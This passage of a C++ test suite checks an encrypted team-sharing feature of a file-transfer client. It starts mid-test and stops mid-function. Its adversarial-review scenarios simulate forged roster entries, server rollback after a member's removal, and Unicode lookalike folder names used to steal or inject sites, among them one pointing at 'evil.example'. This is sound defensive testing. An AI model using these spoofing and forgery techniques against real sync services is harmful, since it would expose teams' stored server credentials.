  std::printf("  push of 4000 sites: %lld ms\n", static_cast<long long>(Timer.elapsed()));
  FakeTeam & T = Srv->Teams[Uuid];
  QByteArray Plain;
  CHECK(TeamCrypto::DecodeSnapshot(T.Snapshots.value(T.Head), Teams().Find(Uuid)->Key.Copy(), Plain));
  QString Name;
  IniFile Ini;
  CHECK(TeamContent::Decode(Plain, Name, Ini));
  CHECK(TeamContent::SiteHashes(Ini).size() == 4000);
  Timer.restart();
  QFile::remove(Dir + QStringLiteral("/nothing"));
  Sites().Remove(Folder + QStringLiteral("/site0"));
  Configuration::Instance().Save();
  CHECK(Wait([&](const auto & D) { Teams().ResolveConflict(Uuid, false, D); }));
  std::printf("  pull of 4000 sites: %lld ms\n", static_cast<long long>(Timer.elapsed()));
  CHECK(Site(Folder + QStringLiteral("/site0")) != nullptr);
}

// T18: Leave or Delete during a sync leaves no ghost
static void ScenarioLeaveDuringSync()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}});
  QString Other = CreateTeam(QStringLiteral("Other"));
  auto Finished = std::make_shared<int>(0);
  Teams().SyncAll([Finished](bool, const QString &) { (*Finished)++; });
  QString Error;
  CHECK(Wait([&](const auto & D) { Teams().Leave(J.Uuid, D); }, &Error));
  Spin([Finished]() { return *Finished != 0; });
  CHECK(Teams().Find(J.Uuid) == nullptr);
  for (const TeamSync::Team & T : Teams().Teams())
  {
    CHECK(!T.Uuid.isEmpty() && !T.Name.isEmpty());
  }
  CHECK(SyncAll());
  CHECK(Teams().Teams().size() == 1);
}

// T19: an operation queued behind a running sync waits for its own push
static void ScenarioQueuedOperation()
{
  Boot();
  Setup S = OwnedTeam();
  FakeTeam & T = Srv->Teams[S.Uuid];
  AddSite(QStringLiteral("Solo"), QStringLiteral("solo.internal"));
  AddSite(S.Folder + QStringLiteral("/first"), QStringLiteral("first.internal"));
  auto Pushed = std::make_shared<bool>(false);
  auto Done = std::make_shared<int>(0);
  // The running sync is past building its snapshot when the operation comes
  Srv->OnRequest = [&, Pushed, Done](const QString & Request)
  {
    if (!Request.contains(QStringLiteral("/sync/commit")))
    {
      return;
    }
    Srv->OnRequest = nullptr;
    Teams().ShareSites(S.Uuid, {QStringLiteral("Solo")}, QString(), false, [&, Pushed, Done](bool Ok, const QString &)
    {
      QString Name;
      QStringList List;
      *Pushed = Read(T.Snapshots.value(T.Head), S.Key, Name, List) && List.contains(QStringLiteral("Solo"));
      *Done = Ok ? 1 : 2;
    });
  };
  Teams().SyncAll();
  Spin([Done]() { return *Done != 0; });
  CHECK(*Done == 1);
  CHECK(*Pushed);
  // an edit made during an upload is not taken for uploaded
  Site(S.Folder + QStringLiteral("/first"))->RemoteDirectory = QStringLiteral("/one");
  Configuration::Instance().Save();
  Srv->OnRequest = [&](const QString & Request)
  {
    if (Request.contains(QStringLiteral("/sync/commit")))
    {
      Srv->OnRequest = nullptr;
      Site(S.Folder + QStringLiteral("/first"))->RemoteDirectory = QStringLiteral("/two");
      Configuration::Instance().Save();
    }
  };
  CHECK(SyncAll());
  CHECK(SyncAll());
  QByteArray Plain;
  CHECK(TeamCrypto::DecodeSnapshot(T.Snapshots.value(T.Head), S.Key, Plain));
  CHECK(Plain.contains("/two"));
}

// T20: a failed save does not move the state on
static void ScenarioSaveFails()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}});
  Srv->PeerPush(J.Owner, J.Uuid, Content(QStringLiteral("Shared"), {{"db", "db2.internal", "pw1"}}));
  QFile::setPermissions(Dir, QFile::ReadOwner | QFile::ExeOwner);
  QString Error;
  bool Ok = SyncAll(&Error);
  QFile::setPermissions(Dir, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
  CHECK(!Ok);
  CHECK_MSG(Error.contains(QStringLiteral("could not be saved")), Error);
  // the next sync gets it right
  Srv->Log.clear();
  CHECK(SyncAll(&Error));
  CHECK(Srv->Log.join(QLatin1Char('\n')).contains(QStringLiteral("download-url")));
  CHECK(Site(J.Folder + QStringLiteral("/db"))->HostName == QStringLiteral("db2.internal"));
}

// T22: two computers making the first key pair at once end with one
static void ScenarioKeyRace()
{
  Boot();
  // the other computer wins between this one's GET and PUT
  TeamCrypto::KeyPair OtherBox = TeamCrypto::NewKeyPair();
  TeamCrypto::SignKey OtherIdentity = TeamCrypto::NewSignKey();
  QByteArray Wrapped = TeamCrypto::WrapPrivateKey(CloudSync::Instance().DataKey(), TeamCrypto::KeyBlob(OtherBox, OtherIdentity));
  Srv->OnRequest = [&](const QString & Request)
  {
    if (Request == QStringLiteral("PUT /v1/keys/me"))
    {
      Srv->OnRequest = nullptr;
      Srv->Keys.insert(VictimUuid, QJsonObject{{"public_key", B64(OtherBox.Public)}, {"identity_key", B64(OtherIdentity.Public)}, {"wrapped_private_key", B64(Wrapped)}});
    }
  };
  // and two callers in this process share one attempt
  auto Calls = std::make_shared<int>(0);
  Teams().CreateTeam(QStringLiteral("One"), [Calls](bool, const QString &) { (*Calls)++; });
  Teams().CreateTeam(QStringLiteral("Two"), [Calls](bool, const QString &) { (*Calls)++; });
  Spin([Calls]() { return *Calls == 2; });
  CHECK(*Calls == 2);
  CHECK(Srv->Log.count(QStringLiteral("PUT /v1/keys/me")) == 1);
  CHECK(UnB64(Srv->Keys[VictimUuid]["identity_key"]) == OtherIdentity.Public);
  CHECK(Teams().Fingerprint() == TeamCrypto::Fingerprint(OtherIdentity.Public));
  CHECK(Teams().Teams().size() == 2);
  // a key that exists is never replaced because of an answer
  auto Switch = [](const QString & User)
  {
    Srv->User = User;
    Srv->SyncHead.clear();
    Srv->SyncObjects.clear();
    SignIn();
    MakeKey();
  };
  Switch(QStringLiteral("bbbbbbbb-0000-4000-8000-000000000002"));
  CHECK(SyncAll());
  Srv->Keys.remove(VictimUuid);
  Switch(VictimUuid);
  Srv->Log.clear();
  QString Error;
  CHECK(!SyncAll(&Error));
  CHECK_MSG(Error.contains(QStringLiteral("no longer has")), Error);
  CHECK(!Srv->Log.contains(QStringLiteral("PUT /v1/keys/me")));
}

static void ScenarioFingerprintsNotices()
{
  Boot();
  Setup S = OwnedTeam();
  CHECK(!Teams().Fingerprint().isEmpty());
  FakeTeam & T = Srv->Teams[S.Uuid];
  T.Key = S.Key;
  // members and their fingerprints come from the roster, not from the server's list
  Peer Carol = NewPeer(QStringLiteral("carol"));
  QString Code = InviteCode(S.Uuid, QStringLiteral("member"));
  Srv->PeerJoin(Carol, Code);
  Notices.clear();
  CHECK(SyncAll());
  CHECK(Notices.join(QLatin1Char('\n')).contains(QStringLiteral("carol@nixscp.test joined")));
  CHECK(Notices.join(QLatin1Char('\n')).contains(TeamCrypto::Fingerprint(Carol.Identity.Public)));
  CHECK(Teams().Find(S.Uuid)->MemberCount == 3);
  auto List = std::make_shared<QJsonArray>();
  auto Done = std::make_shared<int>(0);
  T.ServeMembers = QJsonArray{QJsonObject{{"user_uuid", VictimUuid}}, QJsonObject{{"user_uuid", S.Bob.Uuid}}, QJsonObject{{"user_uuid", NewUuid()}}};
  Teams().Members(S.Uuid, [List, Done](bool Ok, const QString &, const QJsonArray & Members) { *List = Members; *Done = Ok ? 1 : 2; });
  Spin([Done]() { return *Done != 0; });
  CHECK((*Done == 1) && (List->size() == 3));
  bool SawCarol = false;
  for (const QJsonValue & V : *List)
  {
    QJsonObject M = V.toObject();
    CHECK(!M["fingerprint"].toString().isEmpty());
    if (M["user_uuid"].toString() == Carol.Uuid)
    {
      SawCarol = true;
      CHECK(M["fingerprint"].toString() == TeamCrypto::Fingerprint(Carol.Identity.Public));
      CHECK(M["gone"].toBool());   // the server no longer lists the account
    }
  }
  CHECK(SawCarol);
  T.ServeMembers = QJsonArray();
  // removed and back with another key: said as a key change
  CHECK(Wait([&](const auto & D) { Teams().RemoveMember(S.Uuid, Carol.Uuid, D); }));
  Peer Carol2 = Carol;
  Carol2.Identity = TeamCrypto::NewSignKey();
  Carol2.Box = TeamCrypto::NewKeyPair();
  Srv->PeerJoin(Carol2, InviteCode(S.Uuid, QStringLiteral("member")));
  Notices.clear();
  CHECK(SyncAll());
  CHECK(Notices.join(QLatin1Char('\n')).contains(QStringLiteral("key of carol@nixscp.test")));
}

//---------------------------------------------------------------------------
// The adversarial review of 2026-11-05

// An entry a client refuses, on the server for whatever reason: the team is stuck
// for sync, and nobody may be stuck with it. Delete needs no verified chain,
// and anyone can take the team off their computer
static TeamRoster::Entry Reforged(const TeamRoster::Entry & In, const QString & Key, const QJsonValue & Value, const TeamCrypto::SignKey & Signer, const TeamCrypto::SignKey * Second)
{
  QJsonObject Json = QJsonDocument::fromJson(In.Body).object();
  Json[Key] = Value;
  TeamRoster::Entry Result;
  Result.Body = QJsonDocument(Json).toJson(QJsonDocument::Compact);
  Result.Sig = TeamCrypto::Sign(Signer, QByteArrayLiteral("NXT2-ROSTER|") + Result.Body);
  if (Second != nullptr) Result.Sig2 = TeamCrypto::Sign(*Second, QByteArrayLiteral("NXT2-ROSTER|") + Result.Body);
  QJsonObject Wire = TeamRoster::ToWire(Result);
  TeamRoster::Parse(Wire, Result);
  return Result;
}

static void Poison(const Setup & S)
{
  FakeTeam & T = Srv->Teams[S.Uuid];
  Peer Eve = NewPeer(QStringLiteral("eve"));
  TeamCrypto::Invite Code;
  CHECK(TeamCrypto::ParseInviteCode(InviteCode(S.Uuid, QStringLiteral("member")), Code));
  Fake::Invite & I = Srv->Invites[Code.Id];
  TeamCrypto::InviteContent Content;
  CHECK(TeamCrypto::UnwrapForInvite(Code, I.Wrap, T.Uuid, I.KeyVersion, Content));
  QByteArray Wrap = TeamCrypto::WrapForMember(Eve.Box.Public, Content.TeamKey, T.Uuid, I.KeyVersion);
  TeamCrypto::SignKey InviteKey = TeamCrypto::InviteSignKey(Code);
  TeamRoster::Entry Join = TeamRoster::Make(T.Roster, T.Uuid, QStringLiteral("join"), Eve.Uuid,
    TeamRoster::JoinData(Code.Id, Eve.Email, Eve.Identity, Eve.Uuid, Eve.Box.Public, Wrap), Eve.Identity, &InviteKey);
  TeamRoster::Entry Late = Reforged(Join, QStringLiteral("time"), QStringLiteral("2099-01-01T00:00:00.000Z"), Eve.Identity, &InviteKey);
  TeamRoster::State Copy = T.Roster;
  CHECK(!TeamRoster::Apply(Copy, Late));
  T.ServeEntries = T.Entries;
  T.ServeEntries.append(TeamRoster::ToWire(Late));
  T.HasServeEntries = true;
}

static void ScenarioBadChainDelete()
{
  Boot();
  Setup S = OwnedTeam();
  Poison(S);
  QString Error;
  CHECK(!SyncAll(&Error));
  CHECK(Rejected(S.Uuid));
  CHECK(Teams().Find(S.Uuid)->Role == QStringLiteral("owner"));
  // after a restart nothing verified is in memory: the owner must still find Delete
  Teams().Initialize(Configuration::Instance(), CloudSync::Instance());
  CHECK(!SyncAll(&Error));
  CHECK(Teams().Find(S.Uuid)->Role == QStringLiteral("owner"));
  CHECK(Wait([&](const auto & D) { Teams().DeleteTeam(S.Uuid, D); }, &Error));
  CHECK(!Srv->Teams.contains(S.Uuid));
  CHECK(Teams().Find(S.Uuid) == nullptr);
  CHECK(Site(S.Folder + QStringLiteral("/db")) == nullptr);
  CHECK(SyncAll(&Error));
}

static void ScenarioBadChainForget()
{
  Boot();
  Setup S = OwnedTeam();
  AddSite(QStringLiteral("Personal/mine"));
  Poison(S);
  // the server does not even take the delete: the way out needs no server at all
  Srv->FailStatus.insert(QStringLiteral("POST /v1/teams/") + S.Uuid + QStringLiteral("/roster"), 500);
  QString Error;
  CHECK(!SyncAll(&Error));
  CHECK(!Wait([&](const auto & D) { Teams().DeleteTeam(S.Uuid, D); }, &Error));
  CHECK(Wait([&](const auto & D) { Teams().Forget(S.Uuid, true, D); }, &Error));
  CHECK(Teams().Find(S.Uuid) == nullptr);
  CHECK(Site(S.Folder + QStringLiteral("/db")) == nullptr);
  auto Kept = Site(QStringLiteral("Prod (former team)/db"));
  CHECK((Kept != nullptr) && (Kept->Password == QStringLiteral("S3cret-password")));
  CHECK(Site(QStringLiteral("Personal/mine")) != nullptr);
  // the server keeps listing it: no error, no notice, it stays away
  Notices.clear();
  CHECK(SyncAll(&Error));
  CHECK(Teams().Find(S.Uuid) == nullptr);
  CHECK(Notices.isEmpty());
  // also across a restart, and with the sites gone when so asked
  Teams().Initialize(Configuration::Instance(), CloudSync::Instance());
  CHECK(SyncAll(&Error));
  CHECK(Teams().Find(S.Uuid) == nullptr);
  Setup Other = OwnedTeam();
  Poison(Other);
  CHECK(!SyncAll(&Error));
  QString Folder = Other.Folder;
  CHECK(Wait([&](const auto & D) { Teams().Forget(Other.Uuid, false, D); }, &Error));
  CHECK(Site(Folder + QStringLiteral("/db")) == nullptr);
  CHECK(Site(QStringLiteral("Prod (former team) (2)/db")) == nullptr);
}

// One 404 must not reset what a later answer is measured against
static void ScenarioPinFloor()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}}, QStringLiteral("admin"));
  FakeTeam & T = Srv->Teams[J.Uuid];
  Peer Mallory = NewPeer(QStringLiteral("mallory"));
  Srv->PeerJoin(Mallory, Srv->PeerInvite(J.Owner, J.Uuid, QStringLiteral("member"), QStringLiteral("Shared")));
  CHECK(SyncAll());
  QJsonArray OldEntries = T.Entries;
  QByteArray OldWrap = T.Wraps.value(VictimUuid);
  QByteArray OldKey = T.Key;
  qint64 OldHead = T.Head;
  QHash<qint64, QByteArray> OldSnapshots = T.Snapshots;
  Srv->PeerRemove(J.Owner, J.Uuid, Mallory.Uuid);
  Srv->PeerRotate(J.Owner, J.Uuid);
  Srv->PeerPush(J.Owner, J.Uuid, Content(QStringLiteral("Shared"), {{"db", "db.internal", "pw2-after-removal"}}));
  CHECK(SyncAll());
  CHECK(Teams().Find(J.Uuid)->KeyVersion == 2);
  FakeTeam Saved = T;
  // gone for one answer
  Srv->Teams.remove(J.Uuid);
  QString Error;
  CHECK(SyncAll(&Error));
  CHECK(Teams().Find(J.Uuid) == nullptr);
  // back, from before the removal and the rotation
  FakeTeam Old = Saved;
  Old.ServeEntries = OldEntries;
  Old.HasServeEntries = true;
  Old.ServeWrap = OldWrap;
  Old.ServeKeyVersion = 1;
  Old.Head = OldHead;
  Old.Snapshots = OldSnapshots;
  Srv->Teams.insert(J.Uuid, Old);
  Notices.clear();
  CHECK(!SyncAll(&Error));
  CHECK_MSG(Error.contains(QStringLiteral("went back")), Error);
  const TeamSync::Team * Now = Teams().Find(J.Uuid);
  CHECK((Now != nullptr) && !Now->Error.isEmpty() && Now->Key.IsEmpty());
  // nothing leaves under the key the removed member has
  int Puts = Srv->Puts;
  AddSite(QStringLiteral("Team: Shared/new"), QStringLiteral("new.internal"), QStringLiteral("NEW-SECRET-AFTER-REMOVAL"));
  CHECK(!SyncAll(&Error));
  CHECK(Srv->Puts == Puts);
  // across a restart too: the floor is in the sealed state
  Teams().Initialize(Configuration::Instance(), CloudSync::Instance());
  CHECK(!SyncAll(&Error));
  CHECK(Srv->Puts == Puts);
  // the content alone rolled back, the roster intact: refused as well
  Saved.Head = OldHead;
  Srv->Teams.insert(J.Uuid, Saved);
  Srv->Teams[J.Uuid].Snapshots = OldSnapshots;
  CHECK(!SyncAll(&Error));
  CHECK(Srv->Puts == Puts);
}

// The content has a floor of its own: older, under the same key, after a 404
static void ScenarioContentFloor()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}});
  Srv->PeerPush(J.Owner, J.Uuid, Content(QStringLiteral("Shared"), {{"db", "db.internal", "pw2"}}));
  CHECK(SyncAll());
  CHECK(Site(J.Folder + QStringLiteral("/db"))->Password == QStringLiteral("pw2"));
  FakeTeam Saved = Srv->Teams[J.Uuid];
  Srv->Teams.remove(J.Uuid);
  QString Error;
  CHECK(SyncAll(&Error));
  Saved.Head = Saved.Head - 1;
  Srv->Teams.insert(J.Uuid, Saved);
  CHECK(!SyncAll(&Error));
  CHECK_MSG(Error.contains(QStringLiteral("went back")), Error);
  CHECK(Site(J.Folder + QStringLiteral("/db")) == nullptr);
}

// The race of the head with a server that does not catch it: not a dead end
static void ScenarioStaleDemote()
{
  Boot();
  Setup S = OwnedTeam(QStringLiteral("admin"));
  FakeTeam & T = Srv->Teams[S.Uuid];
  T.Key = S.Key;
  qint64 H = T.Head;
  Srv->CheckHead = false;
  bool Pushed = false;
  Srv->OnRequest = [&](const QString & Request)
  {
    if (!Pushed && Request.startsWith(QStringLiteral("POST")) && Request.endsWith(QStringLiteral("/roster")))
    {
      Pushed = true;
      Srv->PeerPush(S.Bob, S.Uuid, Content(QStringLiteral("Prod"), {{"db", "db.internal", "bob-honest-edit"}}));
    }
  };
  QString Error;
  Wait([&](const auto & D) { Teams().SetRole(S.Uuid, S.Bob.Uuid, QStringLiteral("member"), D); }, &Error);
  Srv->OnRequest = nullptr;
  CHECK(!SyncAll(&Error));
  CHECK_MSG(Error.contains(QStringLiteral("restore")), Error);
  CHECK(Wait([&](const auto & D) { Teams().Restore(S.Uuid, H, D); }, &Error));
  CHECK(SyncAll(&Error));
  CHECK(Teams().Find(S.Uuid)->Error.isEmpty());
  AddSite(S.Folder + QStringLiteral("/after"), QStringLiteral("after.internal"));
  qint64 Head = T.Head;
  CHECK(SyncAll(&Error));
  CHECK(T.Head == Head + 1);
}

// An invite is no way below the floor either: an old chain, with an old invite in it
static void ScenarioJoinFloor()
{
  Boot();
  Peer Owner = NewPeer(QStringLiteral("owner"));
  QString Uuid = Srv->PeerCreate(Owner);
  FakeTeam & T = Srv->Teams[Uuid];
  Srv->PeerPush(Owner, Uuid, Content(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}}));
  QString Stale = Srv->PeerInvite(Owner, Uuid, QStringLiteral("member"), QStringLiteral("Shared"));
  QJsonArray OldEntries = T.Entries;
  QString Code = Srv->PeerInvite(Owner, Uuid, QStringLiteral("member"), QStringLiteral("Shared"));
  QString Error;
  CHECK(Wait([&](const auto & D) { Teams().JoinWithCode(Code, D); }, &Error));
  Peer Mallory = NewPeer(QStringLiteral("mallory"));
  Srv->PeerJoin(Mallory, Srv->PeerInvite(Owner, Uuid, QStringLiteral("member"), QStringLiteral("Shared")));
  Srv->PeerRemove(Owner, Uuid, Mallory.Uuid);
  Srv->PeerRotate(Owner, Uuid);
  CHECK(SyncAll(&Error));
  CHECK(Teams().Find(Uuid)->KeyVersion == 2);
  CHECK(Wait([&](const auto & D) { Teams().Leave(Uuid, D); }, &Error));
  CHECK(Teams().Find(Uuid) == nullptr);
  T.ServeEntries = OldEntries;
  T.HasServeEntries = true;
  CHECK(!Wait([&](const auto & D) { Teams().JoinWithCode(Stale, D); }, &Error));
  CHECK_MSG(Error.contains(QStringLiteral("failed verification")), Error);
  CHECK(Teams().Find(Uuid) == nullptr);
  CHECK(!T.Roster.Find(VictimUuid));
}

static void ScenarioPinFloorRecovers()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}}, QStringLiteral("admin"));
  FakeTeam Saved = Srv->Teams[J.Uuid];
  Srv->Teams.remove(J.Uuid);
  QString Error;
  CHECK(SyncAll(&Error));
  CHECK(Site(J.Folder + QStringLiteral("/db")) == nullptr);
  // a real outage, not an attack: the team comes back whole
  Srv->Teams.insert(J.Uuid, Saved);
  CHECK(SyncAll(&Error));
  const TeamSync::Team * Now = Teams().Find(J.Uuid);
  CHECK((Now != nullptr) && Now->Error.isEmpty());
  CHECK(Site(Now->Folder + QStringLiteral("/db")) != nullptr);
  CHECK(Site(Now->Folder + QStringLiteral("/db"))->Password == QStringLiteral("pw1"));
  // leaving and being invited again works over the floor as well
  CHECK(Wait([&](const auto & D) { Teams().Leave(J.Uuid, D); }, &Error));
  QString Code = Srv->PeerInvite(J.Owner, J.Uuid, QStringLiteral("member"), QStringLiteral("Shared"));
  CHECK(Wait([&](const auto & D) { Teams().JoinWithCode(Code, D); }, &Error));
  CHECK(Teams().Find(J.Uuid)->Role == QStringLiteral("member"));
  CHECK(Site(Teams().Find(J.Uuid)->Folder + QStringLiteral("/db")) != nullptr);
  // given up by hand, an invite is still what brings a team back
  CHECK(Wait([&](const auto & D) { Teams().Forget(J.Uuid, false, D); }, &Error));
  CHECK(SyncAll(&Error));
  CHECK(Teams().Find(J.Uuid) == nullptr);
  Srv->PeerRemove(J.Owner, J.Uuid, VictimUuid);
  Srv->PeerRotate(J.Owner, J.Uuid);
  QString Again = Srv->PeerInvite(J.Owner, J.Uuid, QStringLiteral("member"), QStringLiteral("Shared"));
  CHECK(Wait([&](const auto & D) { Teams().JoinWithCode(Again, D); }, &Error));
  CHECK((Teams().Find(J.Uuid) != nullptr) && Teams().Find(J.Uuid)->Error.isEmpty());
}

// A name that folds to another team's folder takes nothing of it
static void ScenarioFoldExfil()
{
  Boot();
  Joined A = MemberOf(QStringLiteral("Prod Servers"), {{"db-a", "a.internal", "TEAM-A-SECRET"}});
  Joined M = MemberOf(QStringLiteral("Lunch"), {{"m1", "m.example", "x"}}, QStringLiteral("admin"));
  CHECK(SyncAll());
  FakeTeam & TM = Srv->Teams[M.Uuid];
  Srv->PeerPush(M.Owner, M.Uuid, Content(QStringLiteral("Prod Server") + QChar(0x017F), {{"m1", "m.example", "x"}}));
  for (int I = 0; I < 4; I++)
  {
    CHECK(SyncAll());
    QByteArray Plain;
    CHECK(TeamCrypto::DecodeSnapshot(TM.Snapshots.value(TM.Head), TM.Key, Plain));
    CHECK(!Plain.contains("TEAM-A-SECRET"));
  }
  QString Folder = FolderOf(M.Uuid);
  CHECK(TeamContent::Fold(Folder) != TeamContent::Fold(A.Folder));
  CHECK(Site(A.Folder + QStringLiteral("/db-a"))->Password == QStringLiteral("TEAM-A-SECRET"));
  CHECK(Teams().SharedSites(M.Uuid) == QStringList({QStringLiteral("m1")}));
  CHECK(Teams().SharedSites(A.Uuid) == QStringList({QStringLiteral("db-a")}));
}

static void ScenarioFoldInject()
{
  Boot();
  Joined A = MemberOf(QStringLiteral("Prod Servers"), {{"db-a", "a.internal", "TEAM-A-SECRET"}}, QStringLiteral("admin"));
  Joined M = MemberOf(QStringLiteral("Lunch"), {{"m1", "m.example", "x"}});
  CHECK(SyncAll());
  FakeTeam & TA = Srv->Teams[A.Uuid];
  qint64 Before = TA.Head;
  Srv->PeerPush(M.Owner, M.Uuid, Content(QStringLiteral("Prod Server") + QChar(0x017F), {{"db-a", "evil.example", "x"}}));
  for (int I = 0; I < 3; I++)
  {
    CHECK(SyncAll());
    CHECK(TA.Head == Before);
  }
  CHECK(Site(A.Folder + QStringLiteral("/db-a"))->HostName == QStringLiteral("a.internal"));
}

// Every way two folder names could look the same, or be the same to the site list
static void ScenarioLookalikes()
{
  Boot();
  QString Base = CreateTeam(QStringLiteral("Prod Mail Servers"));
  AddSite(FolderOf(Base) + QStringLiteral("/real"), QStringLiteral("real.internal"));
  CHECK(SyncAll());
  QStringList Names{
    QStringLiteral("Prod Mail Server") + QChar(0x017F),                                 // long s
    QStringLiteral("PROD MAIL SERVERS"),                                                 // case
    QStringLiteral("Pr") + QChar(0x043E) + QStringLiteral("d Mail Servers"),            // Cyrillic o
    QChar(0xFF30) + QStringLiteral("rod Mail Servers"),                                 // fullwidth P
    QStringLiteral("Pro") + QChar(0x0064) + QChar(0x0301) + QStringLiteral(" Mail Servers"),   // combining mark
    QStringLiteral("Pr0d Mail Servers"),                                                 // zero
    QStringLiteral("Prod Ma1l Servers"),                                                 // one for i
  };
  QSet<QString> Keys{TeamContent::Skeleton(FolderOf(Base))};
  for (const QString & Name : Names)
  {
    QString Uuid = CreateTeam(Name);
    QString Folder = FolderOf(Uuid);
    // each of them is told apart by a suffix, not left to the eye
    CHECK_MSG(Folder != TeamSync::FolderName(Name), Folder);
    CHECK_MSG(Folder.endsWith(QLatin1Char(')')), Folder);
    CHECK_MSG(!Keys.contains(TeamContent::Skeleton(Folder)), Folder);
    Keys.insert(TeamContent::Skeleton(Folder));
    CHECK(Teams().SharedSites(Uuid).isEmpty());
  }
  // what belongs to a team is its folder, spelled exactly: a person's folder that
  // differs only by case is not uploaded with it
  QString Own = CreateTeam(QStringLiteral("Exact"));
  AddSite(FolderOf(Own) + QStringLiteral("/shared"), QStringLiteral("shared.internal"));
  CHECK(SyncAll());
  qint64 OwnHead = Srv->Teams[Own].Head;
  AddSite(FolderOf(Own).toUpper() + QStringLiteral("/personal"), QStringLiteral("personal.internal"), QStringLiteral("PERSONAL-SECRET"));
  CHECK(SyncAll());
  CHECK(Srv->Teams[Own].Head == OwnHead);
  CHECK(Teams().SharedSites(Own) == QStringList({QStringLiteral("shared")}));
  CHECK(!Teams().LocalContent(*Teams().Find(Own)).contains("PERSONAL-SECRET"));
  // the site list folds like this, and only this
  CHECK(TeamContent::Fold(QStringLiteral("Server") + QChar(0x017F)) == TeamContent::Fold(QStringLiteral("SERVERS")));
  CHECK(TeamContent::Fold(QChar(0x212A)) == TeamContent::Fold(QStringLiteral("k")));
  CHECK((QString(QChar(0x212A)).compare(QStringLiteral("k"), Qt::CaseInsensitive) == 0));
  // a folder of the person's that comes later is left alone, and the team moves
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}});
  AddSite(J.Folder.toUpper() + QStringLiteral("/db"), QStringLiteral("personal.internal"));
  Srv->PeerPush(J.Owner, J.Uuid, Content(QStringLiteral("Shared"), {{"db", "team.internal", "pw2"}}));
  CHECK(SyncAll());
  CHECK(Site(FolderOf(J.Uuid) + QStringLiteral("/db"))->HostName == QStringLiteral("team.internal"));
  CHECK(FolderOf(J.Uuid) != J.Folder);
  bool Mine = false;
  for (const auto & Data : Sites().Sessions())
  {
    Mine = Mine || (Data->HostName == QStringLiteral("personal.internal"));
  }
  CHECK(Mine);
}

// A stale head, with a server that does not refuse it: nothing is stuck for good
static void ScenarioLeaveTrap()
{
  Boot();
  Setup S = OwnedTeam(QStringLiteral("admin"));
  FakeTeam & T = Srv->Teams[S.Uuid];
  T.Key = S.Key;
  qint64 H = T.Head;
  Srv->PeerPush(S.Bob, S.Uuid, Content(QStringLiteral("Prod"), {{"db", "db.internal", "pw"}}));
  Srv->Append(T, TeamRoster::Make(T.Roster, S.Uuid, QStringLiteral("leave"), S.Bob.Uuid, QJsonObject{{"head", H}}, S.Bob.Identity));
  T.Wraps.remove(S.Bob.Uuid);
  QString Error;
  CHECK(!SyncAll(&Error));
  CHECK_MSG(Error.contains(QStringLiteral("restore")), Error);
  CHECK(T.Roster.KeyVersion == 1);
  // the owner takes a good version: it goes up with the new key, past the bad head.
  // The first try fails on the way: the choice stands for the next sync
  Srv->FailStatus.insert(QStringLiteral("/rotate"), 503);
  Srv->FailCount.insert(QStringLiteral("/rotate"), 1);
  CHECK(!Wait([&](const auto & D) { Teams().Restore(S.Uuid, H, D); }, &Error));
  CHECK(T.Roster.KeyVersion == 1);
  CHECK(SyncAll(&Error));
  CHECK(T.Roster.KeyVersion == 2);
  CHECK(!Teams().Find(S.Uuid)->NeedsRotation);
  CHECK(SyncAll(&Error));
  CHECK(Teams().Find(S.Uuid)->Error.isEmpty());
  QString Name;
  QStringList List;
  CHECK(Read(T.Snapshots.value(T.Head), Teams().Find(S.Uuid)->Key.View(), Name, List));
  CHECK(List == QStringList({QStringLiteral("db")}));
  // and it stays usable
  AddSite(S.Folder + QStringLiteral("/after"), QStringLiteral("after.internal"));
  CHECK(SyncAll(&Error));
  // no invites before all of this, none needed after
  CHECK(!InviteCode(S.Uuid, QStringLiteral("member")).isEmpty());
}

// A real push between reading the head and signing: the signer learns and signs again
static void ScenarioDemoteRace()
{
  Boot();
  Setup S = OwnedTeam(QStringLiteral("admin"));
  FakeTeam & T = Srv->Teams[S.Uuid];
  T.Key = S.Key;
  bool Pushed = false;
  Srv->OnRequest = [&](const QString & Request)
  {
    if (!Pushed && Request.startsWith(QStringLiteral("POST")) && Request.endsWith(QStringLiteral("/roster")))
    {
      Pushed = true;
      Srv->PeerPush(S.Bob, S.Uuid, Content(QStringLiteral("Prod"), {{"db", "db.internal", "bob-honest-edit"}}));
    }
  };
  QString Error;
  CHECK(Wait([&](const auto & D) { Teams().SetRole(S.Uuid, S.Bob.Uuid, QStringLiteral("member"), D); }, &Error));
  Srv->OnRequest = nullptr;
  CHECK(Pushed);
  CHECK(T.Roster.Find(S.Bob.Uuid)->Role == QStringLiteral("member"));
  CHECK(SyncAll(&Error));
  CHECK(Teams().Find(S.Uuid)->Error.isEmpty());
  CHECK(Site(S.Folder + QStringLiteral("/db"))->Password == QStringLiteral("bob-honest-edit"));
  AddSite(S.Folder + QStringLiteral("/after"), QStringLiteral("after.internal"));
  CHECK(SyncAll(&Error));
}

static void ScenarioRemoveRace()
{
  Boot();
  Setup S = OwnedTeam(QStringLiteral("admin"));
  FakeTeam & T = Srv->Teams[S.Uuid];
  T.Key = S.Key;
  bool Pushed = false;
  Srv->OnRequest = [&](const QString & Request)
  {
    if (!Pushed && Request.startsWith(QStringLiteral("POST")) && Request.endsWith(QStringLiteral("/roster")))
    {
      Pushed = true;
      Srv->PeerPush(S.Bob, S.Uuid, Content(QStringLiteral("Prod"), {{"db", "db.internal", "bob-honest-edit"}}));
    }
  };
  QString Error;
  CHECK(Wait([&](const auto & D) { Teams().RemoveMember(S.Uuid, S.Bob.Uuid, D); }, &Error));
  Srv->OnRequest = nullptr;
  CHECK(T.Roster.KeyVersion == 2);
  CHECK(Teams().Find(S.Uuid)->Error.isEmpty());
  CHECK(Site(S.Folder + QStringLiteral("/db"))->Password == QStringLiteral("bob-honest-edit"));
}

// What a server says the head is goes into no signature
static void ScenarioHeadLie()
{
  Boot();
  Setup S = OwnedTeam(QStringLiteral("admin"));
  FakeTeam & T = Srv->Teams[S.Uuid];
